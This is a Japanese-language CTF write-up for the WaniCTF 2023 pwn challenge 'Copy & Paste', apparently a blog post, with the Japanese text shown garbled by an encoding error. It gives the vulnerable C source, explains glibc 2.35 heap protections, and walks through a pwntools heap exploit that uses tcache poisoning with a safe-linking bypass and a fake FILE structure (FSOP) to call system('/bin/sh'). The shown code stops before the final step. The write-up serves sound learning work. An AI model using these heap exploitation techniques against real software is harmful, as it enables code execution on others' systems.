---
title: "Copy & Paste - WaniCTF 2023"
emoji: "ğŸŠ"
type: "tech"
topics:
  - "ctf"
  - "pwn"
  - "heap"
  - "wanictf"
published: true
published_at: "2023-05-06 19:16"
---

# source code
```c: main.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NOTE_LIST_LEN 16
#define MAX_NOTE_SIZE 4096

void init() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  alarm(180);
}

typedef struct note {
  int size;
  char *ptr;
} note_t;

note_t list[NOTE_LIST_LEN];
note_t copied;

void menu() {
  printf("\n---- memu ----\n");
  printf("1. create note\n");
  printf("2. show note\n");
  printf("3. copy note\n");
  printf("4. paste note\n");
  printf("5. delete note\n");
  printf("6. exit\n");
  printf("--------------\n\n");
}

int get_idx() {
  int idx;
  printf("index: ");
  if ((scanf("%d", &idx) != 1) || idx < 0 || idx >= NOTE_LIST_LEN) {
    printf("Invalid index!\n");
    return -1;
  }
  return idx;
}

int get_size() {
  int size;
  printf("size (0-%d): ", MAX_NOTE_SIZE);
  if ((scanf("%d", &size) != 1) || size < 0 || size > MAX_NOTE_SIZE) {
    printf("Invalid size!\n");
    return -1;
  }
  return size;
}

int is_empty(int idx) {
  int f = (list[idx].ptr == NULL);
  if (f)
    printf("The note is empty!\n");
  return f;
}

void create() {
  int idx, size;
  if ((idx = get_idx()) == -1)
    return;
  if ((size = get_size()) == -1)
    return;
  list[idx].size = size;
  list[idx].ptr = (char *)malloc(list[idx].size);
  memset(list[idx].ptr, 0, list[idx].size);
  printf("Enter your content: ");
  read(0, list[idx].ptr, list[idx].size);
  printf("Done!\n");
}

void show() {
  int idx;
  if ((idx = get_idx()) == -1)
    return;
  if (is_empty(idx))
    return;
  write(1, list[idx].ptr, list[idx].size);
}

void copy() {
  int idx;
  if ((idx = get_idx()) == -1)
    return;
  if (is_empty(idx))
    return;
  copied = list[idx];
  printf("Done!\n");
}

void paste() {
  int idx;
  note_t pasted;
  if ((idx = get_idx()) == -1)
    return;
  if (is_empty(idx))
    return;
  if (copied.ptr == NULL) {
    printf("Please copy a note before pasting!\n");
    return;
  }
  pasted.size = list[idx].size + copied.size;
  if (pasted.size < 0 || pasted.size > MAX_NOTE_SIZE) {
    printf("Invalid size!\nPaste failed!\n");
    return;
  }
  pasted.ptr = (char *)malloc(pasted.size);
  memset(pasted.ptr, 0, pasted.size);
  sprintf(pasted.ptr, "%s%s", list[idx].ptr, copied.ptr);
  free(list[idx].ptr);
  list[idx] = pasted;
  printf("Done!\n");
}

void delete () {
  int idx;
  if ((idx = get_idx()) == -1)
    return;
  if (is_empty(idx))
    return;
  free(list[idx].ptr);
  list[idx].size = 0;
  list[idx].ptr = NULL;
  printf("Done!\n");
}

int main() {
  init();
  int c = 0;

  while (1) {
    menu();
    printf("your choice: ");
    scanf("%d", &c);

    if (c == 1)
      create();
    else if (c == 2)
      show();
    else if (c == 3)
      copy();
    else if (c == 4)
      paste();
    else if (c == 5)
      delete ();
    else if (c == 6)
      return 0;
    else
      printf("Invalid choice!\n");

    scanf("%*[^\n]"); // fflush stdin
  }
  return 0;
}
```

# çŸ¥è­˜
## safe-linking
glibc2.32ä»¥é™ã€safe-linkingãŒå°å…¥ã•ã‚Œã¦ã„ã‚‹ã€‚ä»Šå›ã®exploitã‚’æ›¸ãã†ãˆã§å¤§äº‹ãªã®ã¯tcacheã¸ã®ç™»éŒ²å‡¦ç†ã€‚tcacheã«chunkã‚’ç™»éŒ²ã™ã‚‹tcache_puté–¢æ•°ã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã¯ä»¥ä¸‹ã€‚

https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3174

3183è¡Œç›®ã®ä»¥ä¸‹ã®å‡¦ç†ã«æ³¨ç›®ã€‚
```c: malloc/malloc.c#L3174
  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
```
PROTECT_PTRãƒã‚¯ãƒ­ã®å®šç¾©ã¯ä»¥ä¸‹ã€‚
```c: malloc/malloc.c#L349
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
```
ã¤ã¾ã‚ŠchunkAã‚’freeã—ã¦tcacheã«ç™»éŒ²ã—ãŸå ´åˆã€chunkA.fdã«ã¯&chunkA.fdã‚’12bitå³ã‚·ãƒ•ãƒˆã—ãŸå€¤ã¨tcacheã«å…ƒã€…å…¥ã£ã¦ã„ã‚‹å€¤ã®xorãŒå…¥ã‚‹ã€‚ã“ã‚ŒãŒã‚ã‚‹ã›ã„ã§tcache-poisoningã™ã‚‹ã¨ãã«ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç›´æ¥æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ããªã„ã€‚

## tcacheã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ©Ÿæ§‹
tcacheã«ã¯ä¸Šã®safe-linkingã«åŠ ãˆã¦ã„ãã¤ã‹ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ©Ÿæ§‹ãŒã‚ã‚‹ã€‚ã¾ãšglibc2.29ä»¥é™ã®tcacheã§ã¯double freeå¯¾ç­–ã¨ã—ã¦chunkã®bkãƒ¡ãƒ³ãƒãŒkeyã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã‚‹ã€‚tcacheã«æ ¼ç´ã™ã‚‹éš›ã«chunk.bkã«key(ãƒ©ãƒ³ãƒ€ãƒ ãªå€¤)ãŒæ›¸ãè¾¼ã¾ã‚Œã€tcacheã‹ã‚‰å–ã‚Šå¤–ã™ã¨ãã«0ã§ä¸Šæ›¸ãã•ã‚Œã‚‹ã€‚tcacheã«chunkã‚’æ ¼ç´ã™ã‚‹éš›ã«chunk.bkã«keyã¨åŒã˜å€¤ãŒå…¥ã£ã¦ã„ã‚‹å ´åˆã¯double freeã•ã‚ŒãŸå¯èƒ½æ€§ãŒã‚ã‚‹ã¨ã—ã¦å¯¾å¿œã™ã‚‹tcacheã«æ—¢ã«chunkãŒç™»éŒ²ã•ã‚Œã¦ã„ãªã„ã‹ãƒã‚§ãƒƒã‚¯ã•ã‚Œã‚‹ã€‚ã“ã‚ŒãŒã‚ã‚‹ã®ã§double freeã™ã‚‹ã“ã¨ãŒé›£ã—ããªã£ã¦ã„ã‚‹ã€‚ã“ã®ãƒã‚§ãƒƒã‚¯ã‚’å›é¿ã™ã‚‹ãŸã‚ã«ä»Šå›ã®exploitã§ã¯freeå¾Œã®chunk.mchunk_sizeã‚’æ›¸ãå¤‰ãˆã¦ã„ã‚‹ã€‚freeå¾Œã®chunk.bkã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã§ã‚‚å›é¿ã§ãã‚‹ãŒã€ä»Šå›ã®å•é¡Œã§ã¯æ›¸ãè¾¼ã¿ã‚’è¡Œã†ã“ã¨ãŒå®¹æ˜“ã§ã¯ãªã‹ã£ãŸã®ã§ã‚µã‚¤ã‚ºã‚’æ”¹ç«„ã™ã‚‹ã“ã¨ã«ã—ãŸã€‚

ã•ã‚‰ã«glibc2.30ä»¥é™ã€tcacheãŒç©ºã‹ã©ã†ã‹ã®åˆ¤å®šã«tcache_perthread_structå†…ã®countsé…åˆ—ãŒç”¨ã„ã‚‰ã‚Œã‚‹ã‚ˆã†ã«ãªã£ãŸã€‚ã“ã‚ŒãŒã‚ã‚‹ã®ã§å¯¾å¿œã™ã‚‹entriesé…åˆ—ã®ãƒ¡ãƒ³ãƒãŒNULLã§ãªãã¦ã‚‚ç©ºã¨åˆ¤æ–­ã•ã‚Œã‚‹ã€‚ã¤ã¾ã‚Štcache-poisoningã‚’è¡Œã†éš›ã«ä»¥ä¸‹ã®æ‰‹é †ã§ã‚„ã‚‹ã¨å¤±æ•—ã™ã‚‹ã€‚

- chunkAã‚’freeã—ã¦tcacheã«ç™»éŒ²ã€‚
- heap overflowã‚„use after freeã§chunkA.fdã‚’ä»»æ„ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«æ›¸ãå¤‰ãˆã‚‹ã€‚
- mallocã‚’2å›å‘¼ã³å‡ºã—ã¦2å›ç›®ã®mallocã§æ›¸ãè¾¼ã‚“ã ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å¾—ã‚‹ã€‚

freeã«ã‚ˆã‚Štcacheã«ç™»éŒ²ã—ã¦ã„ã‚‹ã®ã¯æœ€åˆã®1å›ã ã‘ãªã®ã§å¯¾å¿œã™ã‚‹tcacheã«ã¯ã‚¨ãƒ³ãƒˆãƒªãŒ1ã¤ã—ã‹ãªã„ã¨åˆ¤æ–­ã•ã‚Œã‚‹ã€‚ã“ã®ãŸã‚2å›ç›®ã®mallocã§ã¯æ›¸ãè¾¼ã‚“ã ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯è¿”ã‚‰ãªã„ã€‚ä»¥ä¸‹ã®ã‚ˆã†ã«ã™ã‚Œã°ã†ã¾ãã„ãã€‚

- chunkA, chunkBã‚’freeã—ã¦tcacheã«ç™»éŒ²ã€‚
- heap overflowã‚„use after freeã§chunkA.fdã‚’ä»»æ„ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«æ›¸ãå¤‰ãˆã‚‹ã€‚
- mallocã‚’2å›å‘¼ã³å‡ºã—ã¦2å›ç›®ã®mallocã§æ›¸ãè¾¼ã‚“ã ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å¾—ã‚‹ã€‚

chunkA, chunkBã®2ã¤ã‚’freeã—ã¦ã„ã‚‹ã®ãŒãƒã‚¤ãƒ³ãƒˆã€‚ã“ã‚Œã«ã‚ˆã‚Šå¯¾å¿œã™ã‚‹tcacheã«ã¯ã‚¨ãƒ³ãƒˆãƒªãŒ2ã¤ã‚ã‚‹ã¨åˆ¤æ–­ã•ã‚Œã‚‹ã®ã§2å›ç›®ã®mallocã§æ›¸ãè¾¼ã‚“ã ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒè¿”ã‚‹ã€‚


## chunkã®çµ±åˆå‡¦ç†ã®éš›ã®ãƒã‚§ãƒƒã‚¯
chunkã‚’freeã—ã¦unsorted binã«å…¥ã‚Œã‚‹éš›ã€PREV_INUSEãŒ0ã®å ´åˆã¯å‰ã®chunkã¨çµ±åˆã™ã‚‹å‡¦ç†ãŒå…¥ã‚‹ã€‚glibc2.29ä»¥é™ã€ã“ã®å‡¦ç†ã®éš›ã«ä»Šfreeã—ã‚ˆã†ã¨ã—ã¦ã„ã‚‹chunkã®mchunk_prev_sizeã¨å‰ã®chunkã®mchunk_sizeãŒä¸€è‡´ã™ã‚‹ã‹ãƒã‚§ãƒƒã‚¯ã•ã‚Œã‚‹ã‚ˆã†ã«ãªã£ãŸã€‚è©²å½“ç®‡æ‰€ã¯ä»¥ä¸‹ã€‚

https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4600

libc baseã‚’leakã™ã‚‹ã¨ãã¯ä¸Šã®çµ±åˆå‡¦ç†ã‚’åˆ©ç”¨ã—ã¦ä½¿ç”¨ä¸­ã®chunkã‚’æœªä½¿ç”¨ã¨ã—ã¦æ‰±ã‚ã›ã‚‹ã®ãŒå®šçŸ³ã ãŒã€ã“ã®ãƒã‚§ãƒƒã‚¯ãŒã‚ã‚‹ã®ã§mchunk_prev_sizeã®æ”¹ç«„ã«åŠ ãˆã¦ä¸€ã¤å‰ã®chunkã®mchunk_sizeã‚’æ”¹ç«„ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã€‚

## get PC control in libc2.35
ä»Šå›ä½¿ã‚ã‚Œã¦ã„ã‚‹libcã¯2.35ã€‚libc2.34ã§__free_hookã‚„__malloc_hookãŒå‰Šé™¤ã•ã‚ŒãŸã®ã§FSOPã‚’ä½¿ã†ã€‚FSOPã«ã‚ˆã‚‹shellèµ·å‹•ã«ã¯_IO_str_overflowã‚’ç”¨ã„ã‚‹æ‰‹æ³•ãŒã‚ã‚‹ãŒã€glibc2.28ä»¥é™ã¯_s._allocatebufferã‚’mallocã«ç½®ãæ›ãˆã‚‹ãƒ‘ãƒƒãƒãŒé©ç”¨ã•ã‚ŒãŸã®ã§ã“ã‚Œã¯ä½¿ãˆãªã„ã€‚ã“ã®åˆ¶é™ä¸‹ã§shellã‚’èµ·å‹•ã™ã‚‹æ‰‹æ³•ã¨ã—ã¦_IO_wfile_jumps.\__overflowã‚’ç”¨ã„ã‚‹æ‰‹æ³•ãŒã‚ã‚‹ã€‚ã“ã‚Œã¯ä»¥å‰ã®è¨˜äº‹[^1]ã§çœŸé¢ç›®ã«è§£èª¬ã—ãŸã®ã§å‰²æ„›ã€‚

# è„†å¼±æ€§
pasteé–¢æ•°ã®ä»¥ä¸‹ã®éƒ¨åˆ†ãŒè„†å¼±ã€‚createã§ã¯æŒ‡å®šã—ãŸã‚µã‚¤ã‚ºãƒ”ãƒƒã‚¿ãƒªã¾ã§ã—ã‹æ›¸ãè¾¼ã‚ãªã„ãŒreadãŒä½¿ã‚ã‚Œã¦ã„ã‚‹ã®ã§ **null terminateã•ã‚Œãªã„ã€‚** ä»¥ä¸‹ã®éƒ¨åˆ†ã§ã¯"%s%s"ã§æ›¸ãè¾¼ã‚“ã§ã„ã‚‹ã®ã§list[idx].ptrã‚„copied.ptrã‚’null terminateã—ãªã‘ã‚Œã°heap overflowã‚’èµ·ã“ã›ã‚‹ã€‚ã•ã‚‰ã«sprintfã¯æœ€å¾Œã«null byteã‚’æ›¸ãè¾¼ã‚€ã®ã§**null byteã‚’æ›¸ãè¾¼ã‚ã‚‹ã€‚**

```c: main.c
  sprintf(pasted.ptr, "%s%s", list[idx].ptr, copied.ptr);
```

# exploit

https://github.com/RI5255/ctf-writeups/tree/master/2023/wanictf/pwn-copy-paste

## å‰æº–å‚™
ç¹°ã‚Šè¿”ã—ä½¿ã†å‡¦ç†ã‚’é–¢æ•°ã«ã—ã¦ãŠãã€‚
```python: exploit.py
def create(idx :int, size :hex, data: bytes):
    io.sendlineafter(b'your choice: ', b'1')
    io.sendlineafter(b'index: ', str(idx).encode())
    io.sendlineafter(b'size (0-4096): ', str(size).encode())
    io.sendafter(b'Enter your content: ', data.ljust(size, b'\0'))

def show(idx :int):
    io.sendlineafter(b'your choice: ', b'2')
    io.sendlineafter(b'index: ', str(idx).encode())
    return io.recvline()

def copy(idx :int):
    io.sendlineafter(b'your choice: ', b'3')
    io.sendlineafter(b'index: ', str(idx).encode())

def paste(idx :int):
    io.sendlineafter(b'your choice: ', b'4')
    io.sendlineafter(b'index: ', str(idx).encode())

def delete(idx: int):
    io.sendlineafter(b'your choice: ', b'5')
    io.sendlineafter(b'index: ', str(idx).encode())

def ex():
    io.sendlineafter(b'your choice: ', b'6')
```
æ”»æ’ƒã§ä½¿ã†chunkã‚’ç¢ºä¿ã—ã¦ãŠãã€‚
```python: exploit.py
create(0, 0x30 - 8, b'')            # A
create(1, 0x420 - 8, b'')           # B
create(2, 0x20 - 8, b'')            # C
create(3, 0x500 - 8, b'')           # D     
create(4, 0xc, b'e' * 0xc)          # E
create(5, 0xc, b'f' * 0xc)          # F
create(6, 0x10, b'g' * 0x10)        # G
create(7, 0x18, b'h' * 0x18)        # H
create(8, 0x440 - 8, b'')           # I
create(9, 0x400, b'j' * 0x400)      # J
create(10, 0x18, b'k' * 0x18)       # K
create(11, 0x20 - 8, b'')           # L
create(12, 0x20 - 8, b'')           # M
```

## libc base leak
ã¾ãšBã‚’freeã—ã¦unsorted binã«å…¥ã‚Œã‚‹ã€‚ã“ã®å•é¡Œã§ã¯4096ãƒã‚¤ãƒˆã¾ã§mallocã§ãã‚‹ã®ã§Bã®ã‚µã‚¤ã‚ºã‚’tcacheã«å…¥ã‚‰ãªã„ã‚µã‚¤ã‚º(0x420)ã«ã—ã¦ã„ã‚‹ã€‚ã“ã®ãŠã‹ã’ã§tcacheã‚’æ¶ˆè²»ã™ã‚‹ã“ã¨ãªãç›´æ¥unsorted binã«å…¥ã‚Œã‚‹ã“ã¨ãŒã§ãã‚‹ã€‚
```python: exploit.py
# 1: libc base leak
# Bã‚’freeã—ã¦unsorted binã«å…¥ã‚Œã‚‹ã€‚
delete(1)
```
æ¬¡ã«Dã®PREV_INUSEã‚’0ã«ã™ã‚‹ã€‚ã¾ãšdelete(2)ã«ã‚ˆã‚ŠC(size=0x20)ã‚’tcache(0x20)ã«å…¥ã‚Œã¦ã„ã‚‹ã€‚ãã®å¾ŒFã‚’copyã—ã¦Eã«pasteã—ã¦ã„ã‚‹ã€‚Eã¨Fã®ã‚µã‚¤ã‚ºã¯0xcãªã®ã§pasteé–¢æ•°ã§0x18ãƒã‚¤ãƒˆmallocã•ã‚Œã‚‹ã€‚ã“ã‚Œã«ã‚ˆã‚ŠCãŒè¿”ã‚Šã€C.fdã«E.fd + F.fdãŒæ›¸ãè¾¼ã¾ã‚Œã‚‹ã€‚æ›¸ãè¾¼ã¾ã‚Œã‚‹ã®ã¯0x18ãƒã‚¤ãƒˆãªã®ã§sprintfã«ã‚ˆã‚Šnull byteãŒæ›¸ãè¾¼ã¾ã‚Œã€**Dã®PREV_INUSEãŒ0ã«ãªã‚‹ã€‚** ã“ã®æ›¸ãè¾¼ã¿ã«ã‚ˆã‚ŠD.mchunk_sizeã®ä¸‹ä½1byteãŒ0x00ã«ãªã‚‹ã®ã§ãƒ•ãƒ©ã‚°ä»¥å¤–ã«å½±éŸ¿ã‚’ä¸ãˆãªã„ãŸã‚ã«Dã®ã‚µã‚¤ã‚ºã‚’0x500ã«ã—ã¦ã„ã‚‹ã€‚
```python: exploit.py
# Dã®PREV_INUSEã‚’0ã«ã™ã‚‹ã€‚
delete(2)
copy(5)
paste(4) # index4ãŒCã«ãªã‚‹ã€‚ã“ã®æ™‚EãŒfreeã•ã‚Œã‚‹ã€‚
```
æ¬¡ã«D.mchunk_prev_sizeã‚’0x440ã«ã™ã‚‹ã€‚ã“ã‚Œã¯D.mchunk_prev_sizeã®ä½ç½®ã«0x440ã‚’æ›¸ãè¾¼ã‚€ã ã‘ã€‚
```python: exploit.py
# Dã®prev_sizeã‚’0x440ã«ã™ã‚‹ã€‚
delete(4)
create(2, 0x20 - 8, b'a' * 0x10 + pack(0x440))
```
æ¬¡ã«B.mchunk_sizeã‚’0x441ã«ã™ã‚‹ã€‚
```python: exploit.py
# Bã®sizeã‚’0x441ã«ã™ã‚‹ã€‚
delete(0)
copy(7)
paste(6) # index6ãŒAã«ãªã‚‹ã€‚ã“ã®æ™‚chunkGãŒfreeã•ã‚Œã‚‹ã€‚
```
ã¾ãšdelete(0)ã«ã‚ˆã‚ŠA(mchunk_size=0x30)ã‚’tcache(0x30)ã«å…¥ã‚Œã¦ã„ã‚‹ã€‚ãã®å¾ŒHã‚’copyã—ã¦Gã«pasteã—ã¦ã„ã‚‹ã€‚Hã¨Gã®ã‚µã‚¤ã‚ºã¯ãã‚Œãã‚Œ0x18, 0x10ãªã®ã§pasteé–¢æ•°ã§0x28ãƒã‚¤ãƒˆmallocã•ã‚Œã‚‹ã€‚ã“ã‚Œã«ã‚ˆã‚ŠAãŒè¿”ã‚Šã€A.fdã«G.fd + H.fdãŒæ›¸ãè¾¼ã¾ã‚Œã‚‹ã€‚ã“ã®æ™‚heapã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ã„ã‚‹ã€‚(ä¸Šã‹ã‚‰é †ã«G, H, I)

![0](https://storage.googleapis.com/zenn-user-upload/e532582ffe03-20230506.png)

createæ™‚ã€H.fdã«'h' * 0x18ã‚’æ›¸ãè¾¼ã‚“ã§ã„ã‚‹ã€‚ã“ã‚Œã¯ **null terminareã•ã‚Œã¦ã„ãªã„ã€‚** å®Ÿéš›ã€Hã‚’è¡¨ç¤ºã—ã¦ã¿ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚‹ã€‚

![1](https://storage.googleapis.com/zenn-user-upload/f1b0a4875430-20230506.png)

Hã®å¾Œã‚ã¯I.mchunk_size(=441)ãªã®ã§sprintfã®å®Ÿè¡Œã«ã‚ˆã‚ŠA.fdã«G.fd(='g'*0x10) + H.fd(='h'*0x18) + 0x441ãŒæ›¸ãè¾¼ã¾ã‚Œã€**B.mchunk_sizeãŒ0x440ã«ãªã‚‹ã€‚**
ã“ã®çŠ¶æ…‹ã§Dã‚’freeã™ã‚‹ã€‚
```python: exploit.py
# Dã‚’free
delete(3)
```
Dã®PREV_SIZEã‚’0ã€mchunk_prev_sizeã‚’0x440ã«æ”¹ç«„ã—ã¦ã„ã‚‹ã®ã§freeã™ã‚‹ã¨unsorted binã«å…¥ã£ã¦ã„ã‚‹ **Bã¨çµ±åˆã•ã‚Œã‚‹ã€‚** B.mchunk_sizeã‚’0x440ã«æ”¹ç«„ã—ã¦ã„ã‚‹ã®ã§ãƒã‚§ãƒƒã‚¯ã«å¼•ã£æ›ã‹ã‚‹ã“ã¨ã¯ãªã„ã€‚ã“ã‚Œã«ã‚ˆã‚Šheapã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚‹ã€‚

![2](https://storage.googleapis.com/zenn-user-upload/6e79707f872b-20230506.png)

B.mchunk_sizeã‚’0x440ã«æ”¹ç«„ã—ã¦çµ±åˆã—ã¦ã„ã‚‹ã®ã§BãŒ0x440+0x500=0x940ãƒã‚¤ãƒˆã®free chunkã¨ã—ã¦æ‰±ã‚ã‚Œã¦ã„ã‚‹ã€‚ã“ã®çŠ¶æ…‹ã§0x420ãƒã‚¤ãƒˆmallocã™ã‚‹ã¨Bã‹ã‚‰åˆ‡ã‚Šå‡ºã•ã‚Œã¦æ®‹ã‚ŠãŒunsorted binã«ã¤ãªãŒã‚‹ã€‚å®Ÿéš›heapã‚’è¦‹ã¦ã¿ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ã„ã‚‹ã€‚

![3](https://storage.googleapis.com/zenn-user-upload/93381257f6cf-20230506.png)

**ã“ã®æ®‹ã‚Šã®éƒ¨åˆ†ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯Cã¨åŒã˜**ãªã®ã§C.fdã‚’showã§èª­ã¿å‡ºã›ã°&main_arena.bins[0] - 0x10ãŒå¾—ã‚‰ã‚Œã€ãã“ã‹ã‚‰libc baseã‚’leakã§ãã‚‹ã€‚exploitã®å¯¾å¿œã™ã‚‹éƒ¨åˆ†ã¯ä»¥ä¸‹ã€‚
```python: exploit.py
# libc base leak
create(1, 0x420 - 8, b'')
libc_base = unpack(show(2)[:8]) - 0x219ce0
l.address = libc_base
log.info('libc_base = %#016lx'%(libc_base))
```

## FSOP
å¾Œã¯FSOPã™ã‚Œã°çµ‚ã‚ã‚Šã€‚_IO_2_1_stderr_ã‚„_IO_2_1_stdout_ã‚’æ”¹ç«„ã™ã‚‹ã“ã¨ã‚‚è€ƒãˆãŸãŒä»¥ä¸‹ã®éƒ¨åˆ†ãŒå•é¡Œã€‚
```c: main.c#L69
  memset(list[idx].ptr, 0, list[idx].size);
  printf("Enter your content: ");
```
_IO_2_1_stderr_ã‚’æ”¹ç«„ã™ã‚‹ãŸã‚ã«ã¯list[idx].ptrã‚’&_IO_2_1_stderr_ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ãŒmemsetã§0åˆæœŸåŒ–ã•ã‚ŒãŸå¾Œã«printfãŒå‘¼ã°ã‚Œã‚‹ã®ã§æ­»ã¬ã€‚ãã“ã§heapã«å½ã®_IO_FILE_plusæ§‹é€ ä½“ã‚’ç”¨æ„ã—ã¦_IO_list_allã«æ›¸ãè¾¼ã‚€ã“ã¨ã«ã—ãŸã€‚

ã¾ãšã“ã®æ™‚ç‚¹ã§tcache(0x20)ã«ã¯G,EãŒå…¥ã£ã¦ã„ã‚‹ã®ã§ã“ã‚Œã‚’æ¶ˆè²»ã—ã¦ãŠãã€‚(Eã¯å¾Œã§ä½¿ã†ã€‚)
```python: exploit.py
create(6, 0x10, b'g' * 0x10)
create(4, 0xc, b'e' * 0xc)
```
æ¬¡ã«0x30ãƒã‚¤ãƒˆã®chunkã‚’ç¢ºä¿ã—ã¦deleteã—ã¦ã„ã‚‹ã€‚ã“ã‚Œã¯å‰ã®stageã§unsorted binã«ç™»éŒ²ã—ãŸchunkã‹ã‚‰åˆ‡ã‚Šå‡ºã•ã‚Œã‚‹ã€‚
```python: exploit.py
create(13, 0x30 - 8, b'') # chunkCã‹ã‚‰åˆ‡ã‚Šå‡ºã•ã‚Œã‚‹ã€‚
delete(13)
# tcahce(0x30): C
```
å®Ÿéš›heapã‚’è¦‹ã¦ã¿ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ã„ã‚‹ã€‚

![4](https://storage.googleapis.com/zenn-user-upload/aeb709e3802a-20230506.png)

æ¬¡ã«ä»Šdeleteã—ã¦tcache(0x30)ã«ã„ã‚ŒãŸCã®fdã‚’leakã™ã‚‹ã€‚(list[2].ptrã¯ã¾ã &C.fdã«ãªã£ã¦ã„ã‚‹)ã“ã®å€¤ã¯safe-linkingã«ã‚ˆã£ã¦&C.fdã‚’12bitå³ã‚·ãƒ•ãƒˆã—ãŸå€¤ã«ãªã£ã¦ã„ã‚‹ã€‚ã“ã“ã§leakã—ãŸå€¤ã‚’tcahce-posisoningã™ã‚‹ã¨ãã«ä½¿ã†ã€‚
```python: exploit.py
# leak chunkC.fd to bypass safe-linking
shr12_chunkC = unpack(show(2)[:8])
heap_base    = (shr12_chunkC << 12)
log.info('(&C.fd >>12) = %#016lx'%(shr12_chunkC))
log.info('heap_base = %#016lx'%(heap_base))
```
æ¬¡ã«&I.fdã«å½ã®_IO_FILE_plusæ§‹é€ ä½“ã‚’ç”¨æ„ã™ã‚‹ã€‚ã“ã‚Œã¯ä»¥å‰ã®è¨˜äº‹ã§èª¬æ˜ã—ãŸé€šã‚Šãªã®ã§èª¬æ˜ã¯çœç•¥ã€‚
```python: exploit.py
# chunkIã®ä½ç½®ã«_IO_FILE_plusæ§‹é€ ä½“ã‚’ç”¨æ„ã™ã‚‹
delete(8)
system = l.sym['system']
wfile_jumps = l.sym['_IO_wfile_jumps']
chunkI = heap_base + 0xc90

# fake _IO_FILE_plus struct
fake_file = b'  /bin/sh\0' # _flags
fake_file = fake_file.ljust(0xa0, b'\0')
fake_file += pack(chunkI + 0xe0) # _wide_data
fake_file = fake_file.ljust(0xc0, b'\0')
fake_file += p32(1) # _mode
fake_file = fake_file.ljust(0xd8, b'\0')
fake_file += pack(wfile_jumps) # vtable

# fake _IO_wide_data & _IO_jump_t struct
fake_wide_data = pack(0) * 4
fake_wide_data += pack(1) # _IO_write_ptr
fake_wide_data = fake_wide_data.ljust(0x8 * 13, b'\0')
fake_wide_data += pack(system) # __doallocate
fake_wide_data = fake_wide_data.ljust(0xe0, b'\0')
fake_wide_data += pack(chunkI + 0xe0)

create(8, 0x440 - 8, fake_file + fake_wide_data)
```
å¾Œã¯_IO_list_allã«&I.fdã‚’æ›¸ãè¾¼ã‚“ã§exitã‚’å‘¼ã¹ã°ã‚ˆã„ã€‚ã¾ãšL(mchunk_size=0x20)ã‚’deleteã—ã¦tcache(0x20)ã«ç™»éŒ²ã™ã‚‹ã€‚
```python: exploit.py
delete(11)
# tcahce(0x20): L
# tcache(0x30): C
```
ãã®å¾Œå‰ã¨åŒã˜æ‰‹æ³•ã§C.mchunk_sizeã‚’0x20ã«æ›¸ãå¤‰ãˆã¦deleteã™ã‚‹ã€‚
```python: exploit.py
# chunkCã®sizeã‚’0x20ã«æ›¸ãå¤‰ãˆã‚‹ã€‚
delete(1)
copy(10)
paste(9) # index9ãŒBã«ãªã‚‹ã€‚ã“ã®æ™‚JãŒfreeã•ã‚Œã‚‹ã€‚

delete(2)
# tcahce(0x20): C -> L
# tcache(0x30): C -> L
```
æ¬¡ã«C.fdã‚’&_IO_list_allã«æ›¸ãå¤‰ãˆã‚‹ã€‚safe-linkingã‚’bypassã™ã‚‹ãŸã‚ã«å‰ã«leakã—ãŸ&C.fd>>12ã¨ã®xorã‚’å–ã£ãŸå€¤ã‚’æ›¸ãè¾¼ã‚“ã§ã„ã‚‹ã€‚
```python: exploit.py
# tcache-poisoning
io_list_all = l.sym['_IO_list_all']
log.info('&_IO_list_all = %#016lx'%(io_list_all))
create(2, 0x30 - 8, pack(io_list_all ^ shr12_chunkC))
# tcache(0x20): C -> &_IO_list_all
# tcahce(0x30): L
```
ã“ã®æ™‚ã®binã‚’è¦‹ã¦ã¿ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ãŠã‚Šã€æ”»æ’ƒãŒæˆåŠŸã—ã¦ã„ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚‹ã€‚

![5](https://storage.googleapis.com/zenn-user-upload/4f36f482c1ca-20230506.png)

æ¬¡ã«Eã‚’deleteã™ã‚‹ã€‚
```python: exploit.py
delete(4)
# tcache(0x20): E -> C -> &_IO_list_all
```
æ¬¡ã«E.fdã«&I.fdã®ä¸‹ä½3ãƒã‚¤ãƒˆã€C.fdã«&I.fdã®ä¸Šä½3byteæ›¸ãè¾¼ã‚€ã€‚
```python: exploit.py
log.info('&chunkI.fd = %#016lx'%(chunkI))
log.info('lower 3byte: %#016lx'%(unpack(pack(chunkI)[:3].ljust(8, b'\0'))))
create(4, 0x4, pack(chunkI)[:3])
# tcache(0x20): C -> &_IO_list_all
log.info('upper 3byte: %#016lx'%(unpack(pack(chunkI)[3:6].ljust(8, b'\0'))))
create(2, 0x4, pack(chunkI)[3:6])
# tcache(0x20): &_IO_list_all
```
